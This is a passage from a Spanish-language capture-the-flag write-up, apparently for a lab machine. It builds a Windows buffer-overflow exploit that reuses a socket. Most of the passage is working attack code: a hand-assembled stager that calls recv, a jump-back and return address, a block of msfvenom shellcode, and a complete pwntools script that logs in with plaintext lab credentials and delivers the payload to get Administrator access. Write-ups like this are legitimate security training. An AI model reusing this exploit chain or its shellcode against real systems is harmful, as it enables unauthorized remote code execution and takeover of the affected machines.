recv += b"\x8b\x30" 				# -> mov esi, dword [eax]
recv += b"\x83\xec\x70" 			# -> sub esp, 0x70
recv += b"\x31\xdb" 				# -> xor ebx, ebx
recv += b"\x53" 				# -> push ebx 
recv += b"\x66\x81\xc3\x10\x04" 		# -> add bx, 0x410
recv += b"\x53" 				# -> push ebx
recv += b"\x54"					# -> push esp	
recv += b"\x5b"					# -> pop ebx
recv += b"\x66\x83\xc3\x70"			# -> add bx, 0x70
recv += b"\x53"					# -> push ebx

payload = recv + b"\xAA"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70
```
Ahora simplemente hice un `push ebx` que contenia el *bufer* y un `push esi` que contenia el descriptor del *socket*.

![image](https://camo.githubusercontent.com/d636659a35f69f53c2bb322cb29c2ecd9341b90ca4a66daa2e8eac6fe6231e3b/68747470733a2f2f696d6775722e636f6d2f506e5a416d4c5a2e706e67)
 
Ejecuto el *exploit* con los nuevos valores y este fue el resultado:

![image](https://user-images.githubusercontent.com/69093629/158071328-48556507-c6ff-409a-8d34-4f81b018276b.png)
 
Perfecto!, ya tenia todos los valores correspondientes adecuados al *socket*, lo que unico que faltaba era hacer la llamada, por lo cual necesitaba la direccion del *socket*, este lo extraje de `ghidra`.
 
![image](https://camo.githubusercontent.com/f1e10cc2ed963a914acd3f9c149da295fdfcf14b55c7dbc33b50194e3616903a/68747470733a2f2f696d6775722e636f6d2f74457a547946692e706e67)
  
Esta direccion la puse en *EAX* con `mov eax, [0x719082ac]` y hice una llamada a *EAX*.

![image](https://camo.githubusercontent.com/8f6c8bc1fd2b505f32ba4d2d7272e84cf2deb3938c00554871402cd3eea4c035/68747470733a2f2f696d6775722e636f6d2f36346d566375312e706e67)

Converti las A en NOPS y este es el aspecto que tenia el *exploit*.

```python
recv = b""
recv += b"\x54" 				# -> push esp
recv += b"\x58" 				# -> pop eax
recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8
recv += b"\x8b\x30" 				# -> mov esi, dword [eax]
recv += b"\x83\xec\x70" 			# -> sub esp, 0x70
recv += b"\x31\xdb" 				# -> xor ebx, ebx
recv += b"\x53" 				# -> push ebx 
recv += b"\x66\x81\xc3\x10\x04" 		# -> add bx, 0x410
recv += b"\x53" 				# -> push ebx
recv += b"\x54"					# -> push esp
recv += b"\x5b"					# -> pop ebx
recv += b"\x66\x83\xc3\x70"			# -> add bx, 0x70
recv += b"\x53"					# -> push ebx
recv += b"\x56" 				# -> push esi
recv += b"\xa1\xac\x82\x90\x71"			# -> mov eax, [0x719082ac]
recv += b"\xff\xd0"				# -> call eax

payload = recv + b"\x90"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70
```

Ahora simplemente cree mi *shellcode* con `msfvenom`.

![image](https://camo.githubusercontent.com/3bc13d9861696a4ed9d61b9acfb22ea4d97183eb5f149ba2111de6925d7d8396/68747470733a2f2f696d6775722e636f6d2f4259316434656c2e706e67)
 
Lo introduje en el *exploit* y asi quedo entero.

```python
#!/usr/bin/python3

from pwn import *
from sys import argv
from time import sleep

class Exploit():

	def __init__(self, user, password, name):
		self.__user = user
		self.__password = password
		self.__name = name

	def socket_reuse(self):
	
		"""
		int recv(
  			[in]  SOCKET s, 0x
  			[out] char   *buf, -> 0x00be40f0
  			[in]  int    len, ->  0x00000410 
  			[in]  int    flags -> 0x00000000
		);
		"""
		# Cambiar a vuestro shellcode
		buf =  b""
    buf += b"\xdb\xdc\xd9\x74\x24\xf4\xb8\x0c\x84\x35\xbe\x5a\x33"
    buf += b"\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\x4e\x97\xd7"
    buf += b"\x4b\xb2\x7f\x95\xb4\x4a\x80\xfa\x3d\xaf\xb1\x3a\x59"
    buf += b"\xa4\xe2\x8a\x29\xe8\x0e\x60\x7f\x18\x84\x04\xa8\x2f"
    buf += b"\x2d\xa2\x8e\x1e\xae\x9f\xf3\x01\x2c\xe2\x27\xe1\x0d"
    buf += b"\x2d\x3a\xe0\x4a\x50\xb7\xb0\x03\x1e\x6a\x24\x27\x6a"
    buf += b"\xb7\xcf\x7b\x7a\xbf\x2c\xcb\x7d\xee\xe3\x47\x24\x30"
    buf += b"\x02\x8b\x5c\x79\x1c\xc8\x59\x33\x97\x3a\x15\xc2\x71"
    buf += b"\x73\xd6\x69\xbc\xbb\x25\x73\xf9\x7c\xd6\x06\xf3\x7e"
    buf += b"\x6b\x11\xc0\xfd\xb7\x94\xd2\xa6\x3c\x0e\x3e\x56\x90"
    buf += b"\xc9\xb5\x54\x5d\x9d\x91\x78\x60\x72\xaa\x85\xe9\x75"
    buf += b"\x7c\x0c\xa9\x51\x58\x54\x69\xfb\xf9\x30\xdc\x04\x19"
    buf += b"\x9b\x81\xa0\x52\x36\xd5\xd8\x39\x5f\x1a\xd1\xc1\x9f"
    buf += b"\x34\x62\xb2\xad\x9b\xd8\x5c\x9e\x54\xc7\x9b\xe1\x4e"
    buf += b"\xbf\x33\x1c\x71\xc0\x1a\xdb\x25\x90\x34\xca\x45\x7b"
    buf += b"\xc4\xf3\x93\x2c\x94\x5b\x4c\x8d\x44\x1c\x3c\x65\x8e"
    buf += b"\x93\x63\x95\xb1\x79\x0c\x3c\x48\xea\x39\xcb\x42\xdf"
    buf += b"\x55\xc9\x62\x1e\x1d\x44\x84\x4a\x71\x01\x1f\xe3\xe8"
    buf += b"\x08\xeb\x92\xf5\x86\x96\x95\x7e\x25\x67\x5b\x77\x40"
    buf += b"\x7b\x0c\x77\x1f\x21\x9b\x88\xb5\x4d\x47\x1a\x52\x8d"
    buf += b"\x0e\x07\xcd\xda\x47\xf9\x04\x8e\x75\xa0\xbe\xac\x87"
    buf += b"\x34\xf8\x74\x5c\x85\x07\x75\x11\xb1\x23\x65\xef\x3a"
    buf += b"\x68\xd1\xbf\x6c\x26\x8f\x79\xc7\x88\x79\xd0\xb4\x42"
    buf += b"\xed\xa5\xf6\x54\x6b\xaa\xd2\x22\x93\x1b\x8b\x72\xac"
    buf += b"\x94\x5b\x73\xd5\xc8\xfb\x7c\x0c\x49\x1b\x9f\x84\xa4"
    buf += b"\xb4\x06\x4d\x05\xd9\xb8\xb8\x4a\xe4\x3a\x48\x33\x13"
    buf += b"\x22\x39\x36\x5f\xe4\xd2\x4a\xf0\x81\xd4\xf9\xf1\x83"

		recv = b""
		recv += b"\x54" 				# -> push esp
		recv += b"\x58" 				# -> pop eax
		recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
		recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8
		recv += b"\x8b\x30" 				# -> mov esi, dword [eax]
		recv += b"\x83\xec\x70" 			# -> sub esp, 0x70
		recv += b"\x31\xdb" 				# -> xor ebx, ebx
		recv += b"\x53" 				# -> push ebx 
		recv += b"\x66\x81\xc3\x10\x04" 		# -> add bx, 0x410
		recv += b"\x53" 				# -> push ebx
		recv += b"\x54"					# -> push esp
		recv += b"\x5b"					# -> pop ebx
		recv += b"\x66\x83\xc3\x70"			# -> add bx, 0x70
		recv += b"\x53"					# -> push ebx
		recv += b"\x56" 				# -> push esi
		recv += b"\xa1\xac\x82\x90\x71"			# -> mov eax, [0x719082ac]
		recv += b"\xff\xd0"				# -> call eax
    
		payload = recv + b"\x90"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70

		r = remote("10.10.11.115", argv[1])

		r.sendlineafter(b"Username: ",self.__user)
		r.sendlineafter(b"Password: ",self.__password)
		r.sendlineafter(b"FullName:",self.__name)	
		r.sendlineafter(b"Input Your Code:",payload)
		sleep(1)
		r.sendline(buf)

autopwn = Exploit(b'alfiansyah', b'K3r4j@@nM4j@pAh!T', 'Vickry Alfiansyah')

def main():
	autopwn.socket_reuse()

if __name__ == '__main__':
	main()
```
 
Simplemente lo ejecute y gane acceso como Administrator.
 
![image](https://camo.githubusercontent.com/e7373458ff66365c24a17f8bf2f8f770351051d433d22b9e3def4456b75bdfc7/68747470733a2f2f696d6775722e636f6d2f32774b766a7a752e706e67)
  
Y ya pude visualizar la *flag*.

![158071328-48556507-c6ff-409a-8d34-4f81b018276b](https://user-images.githubusercontent.com/69093629/158269055-566edf0d-96e8-4a92-8df8-db85814f79ff.png)
